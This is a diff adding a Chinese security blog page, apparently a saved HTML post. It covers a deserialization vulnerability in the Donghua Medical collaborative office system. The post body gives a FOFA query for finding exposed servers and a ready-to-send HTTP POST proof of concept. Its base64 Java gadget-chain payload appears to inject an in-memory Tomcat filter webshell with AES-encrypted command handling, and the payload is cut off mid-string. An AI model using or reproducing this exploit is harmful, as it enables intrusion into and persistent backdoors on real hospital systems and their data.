@@ -1,0 +1,697 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <link rel="icon" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="东华医疗协同办公系统反序列化漏洞fofa1body&#x3D;&quot;东华医疗协同办公系统&quot; poc1234567891011121314151617181920POST &#x2F;workflow&#x2F;DemoDefinitionProxyServlet&#x2F;111 HTTP&#x2F;1.1Host: xx.xx.xx.xxContent-Length: 13283Cache-Control: max-age&#x3D;0S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="东华医疗协同办公系统反序列化漏洞">
+<meta property="og:url" content="http://example.com/1970/01/01/POC/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="东华医疗协同办公系统反序列化漏洞fofa1body&#x3D;&quot;东华医疗协同办公系统&quot; poc1234567891011121314151617181920POST &#x2F;workflow&#x2F;DemoDefinitionProxyServlet&#x2F;111 HTTP&#x2F;1.1Host: xx.xx.xx.xxContent-Length: 13283Cache-Control: max-age&#x3D;0S">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-27T02:41:20.857Z">
+<meta property="article:author" content="Ninja">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>东华医疗协同办公系统反序列化漏洞 - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-th-large"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" target="_self">
+                <i class="iconfont icon-book"></i>
+                <span>漏洞知识库</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>在线工具</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="东华医疗协同办公系统反序列化漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="1970-01-01 08:00" pubdate>
+          1970年1月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          237 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          2 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">东华医疗协同办公系统反序列化漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="东华医疗协同办公系统反序列化漏洞"><a href="#东华医疗协同办公系统反序列化漏洞" class="headerlink" title="东华医疗协同办公系统反序列化漏洞"></a>东华医疗协同办公系统反序列化漏洞</h2><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;东华医疗协同办公系统&quot;</span><br></code></pre></td></tr></table></figure>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/workflow/DemoDefinitionProxyServlet/111</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xx.xx.xx.xx<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>13283<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://xx.xx.xx.xx<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-swift"><span class="hljs-operator">&lt;</span><span class="hljs-meta">@d_base64</span><span class="hljs-operator">&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC<span class="hljs-regexp">/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAI3HK/</span>rq<span class="hljs-operator">+</span><span class="hljs-type">AAAAMQHfAQAlb3JnL2FwYWNoZS9jb21tb25zL2VsL3BhcnNlci9Bc3RNaW51cwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgcABQEABjxpbml0PgEAAygpVgEABENvZGUMAAcACAoABAAKAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAApFeGNlcHRpb25zAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uBwAPAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAEwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QHABUBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQcAFwEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4HABkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0BwAbAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UHAB0BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAB8BABFqYXZhL3V0aWwvSGFzaE1hcAcAIQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgcAIwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwAlAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAcAJwEAGW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3QHACkBACZvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2h0dHAvUGFyYW1ldGVycwcAKwEAF2phdmEvdXRpbC9MaW5rZWRIYXNoTWFwBwAtAQASamF2YS91dGlsL0l0ZXJhdG9yBwAvAQAQamF2YS9sYW5nL1N0cmluZwcAMQEAE2phdmEvdXRpbC9BcnJheUxpc3QHADMBAA1TdGFja01hcFRhYmxlAQAHUmVmZXJlcggANgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAA4ADkLABwAOgEAEmh0dHBzOi8vYmFpZHUuY29tLwgAPAEAEGVxdWFsc0lnbm9yZUNhc2UBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoMAD4APwoAMgBAAQArb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZQcAQgEAI2phdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RXcmFwcGVyBwBEAQAKZ2V0UmVxdWVzdAgARgEAD2phdmEvbGFuZy9DbGFzcwcASAEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAEoASwoASQBMAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABOAE8KACAAUAEALG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlRmFjYWRlBwBSAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2VXcmFwcGVyBwBUAQALZ2V0UmVzcG9uc2UIAFYBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwASgBYCwAcAFkBAARQT1NUCABbAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDABdAF4KADIAXwoAIgAKAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsMAGIAYwoAQwBkAQAHcmVxdWVzdAgAZgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABoAGkKACIAagEACHJlc3BvbnNlCABsAQAHc2Vzc2lvbggAbgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7DABwAHELABYAcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIHAHQBAAhyZWFkTGluZQwAdgBYCgB1AHcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAAcAeQoAJgB6AQAGbGVuZ3RoAQADKClJDAB8AH0KACYAfgoAJgAKAQANZ2V0RmllbGRWYWx1ZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DACBAIIKAAIAgwEADWNveW90ZVJlcXVlc3QIAIUBAA1nZXRQYXJhbWV0ZXJzAQAqKClMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9odHRwL1BhcmFtZXRlcnM7DACHAIgKACoAiQEAD3BhcmFtSGFzaFZhbHVlcwgAiwEACGVudHJ5U2V0AQARKClMamF2YS91dGlsL1NldDsMAI0AjgoALgCPAQANamF2YS91dGlsL1NldAcAkQEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAkwCUCwCSAJUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMAJcAmAsAMACZAQATamF2YS91dGlsL01hcCRFbnRyeQcAmwEABmdldEtleQwAnQCYCwCcAJ4BAAh0b1N0cmluZwwAoABYCgAEAKEBAAEgCACjAQABKwgApQEACnJlcGxhY2VBbGwBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwApwCoCgAyAKkBAAhnZXRWYWx1ZQwAqwCYCwCcAKwBAARzaXplDACuAH0KADQArwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwAsQCyCgAmALMBAAE9CAC1AQADZ2V0AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DAC3ALgKADQAuQEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwAsQC7CgAmALwBAAdoYXNOZXh0AQADKClaDAC</span><span class="hljs-operator">+</span><span class="hljs-type">AL8LADAAwAEABW5vTG9nAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWDADCAMMKAAIAxAEAEGVhYzlmYTM4MzMwYTc1MzUIAMYBAAF1CADIAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYMAMoAywsAJADMAQADQUVTCADOAQATamF2YXgvY3J5cHRvL0NpcGhlcgcA0AEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsMANIA0woA0QDUAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwcA1gEACGdldEJ5dGVzAQAEKClbQgwA2ADZCgAyANoBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgwABwDcCgDXAN0BABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgwADADfCgDRAOABABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIIAOIBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwA5ADlCgBJAOYBAAtkZWZpbmVDbGFzcwgA6AEAAltCBwDqAQARamF2YS9sYW5nL0ludGVnZXIHAOwBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAO4A7wkA7QDwAQARZ2V0RGVjbGFyZWRNZXRob2QMAPIASwoASQDzAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcA9QEADXNldEFjY2Vzc2libGUBAAQoWilWDAD3APgKAPYA</span><span class="hljs-operator">+</span><span class="hljs-type">QoAJgChAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwA</span><span class="hljs-regexp">/AD9CgACAP4BAAdkb0ZpbmFsAQAGKFtCKVtCDAEAAQEKANEBAgEAEGphdmEvbGFuZy9UaHJlYWQHAQQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAQYBBwoBBQEIAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwBCgELCgEFAQwBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwBDgEPCgDtARABAAtuZXdJbnN0YW5jZQwBEgCYCgBJARMKAAQAXwEAE2phdmEvaW8vSU9FeGNlcHRpb24HARYBAAdkZXN0cm95AQAIPGNsaW5pdD4BADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UHARoBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0BwEcAQAQamF2YS9sYW5nL1N5c3RlbQcBHgEACG5hbm9UaW1lAQADKClKDAEgASEKAR8BIgEAFShKKUxqYXZhL2xhbmcvU3RyaW5nOwwBDgEkCgAyASUBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsMAScBKAoBGwEpAQAjb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3QHASsBAApnZXRDb250ZXh0AQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0OwwBLQEuCwEsAS8BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMATEBMgoABAEzAQANZ2V0U3VwZXJjbGFzcwwBNQEyCgBJATYBAAlyZXNvdXJjZXMIATgBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAE6ATsKAEkBPAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwE+CgE/</span><span class="hljs-type">APkBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAtwFBCgE</span><span class="hljs-regexp">/AUIBAAdjb250ZXh0CAFEAQANZmlsdGVyQ29uZmlncwgBRgEADWphdmEvdXRpbC9NYXAHAUgKAAIACgEAL29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmBwFLCgFMAAoBAAlzZXRGaWx0ZXIBABkoTGphdmF4L3NlcnZsZXQvRmlsdGVyOylWDAFOAU8KAUwBUAEADXNldEZpbHRlck5hbWUMAVIAeQoBTAFTAQAHZ2V0TmFtZQwBVQBYCgBJAVYBAA5zZXRGaWx0ZXJDbGFzcwwBWAB5CgFMAVkBAAxhZGRGaWx0ZXJEZWYBADQoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmOylWDAFbAVwKAR0BXQEAL29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwBwFfCgFgAAoBAAdwYXR0ZXJuAQASTGphdmEvbGFuZy9TdHJpbmc7DAFiAWMJAAIBZAEADWFkZFVSTFBhdHRlcm4MAWYAeQoBYAFnCgFgAVMBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlBwFqAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwwBbAFtCQFrAW4BAARuYW1lDAFwAFgKAWsBcQEADXNldERpc3BhdGNoZXIMAXMAeQoBYAF0AQASYWRkRmlsdGVyTWFwQmVmb3JlAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcDspVgwBdgF3CgEdAXgBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWcHAXoBABtvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQHAXwBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAF+AX8KAEkBgAEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwGCCgGDAPkBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMARIBhQoBgwGGCwFJAGoBABBqYXZhLnV0aWwuQmFzZTY0CAGJAQAKZ2V0RGVjb2RlcggBiwEABmRlY29kZQgBjQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAY8BAAxkZWNvZGVCdWZmZXIIAZEBAAlnZXRVbnNhZmUBABMoKUxzdW4vbWlzYy9VbnNhZmU7AQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAZUBAA9zdW4vbWlzYy9VbnNhZmUHAZcBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwGZCgGaAAoBAA1nZXRTdGFja1RyYWNlAQAgKClbTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDsMAZwBnQoBmgGeAQAbamF2YS9sYW5nL1N0YWNrVHJhY2VFbGVtZW50BwGgAQAMZ2V0Q2xhc3NOYW1lDAGiAFgKAaEBowEADmdldENsYXNzTG9hZGVyDAGlAQsKAEkBpgwBkwGUCgGYAagBADljb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5VbnNhZmVSZWZsZWN0aW9uQWNjZXNzb3IIAaoBAAl0aGVVbnNhZmUIAawBADtpby5uZXR0eS51dGlsLmludGVybmFsLnNoYWRlZC5vcmcuamN0b29scy51dGlsLlVuc2FmZUFjY2VzcwgBrgEABlVOU0FGRQgBsAEAEGdldE1ldGhvZEJ5Q2xhc3MBAFEoTGphdmEvbGFuZy9DbGFzcztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABJnZXRNZXRob2RBbmRJbnZva2UBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVj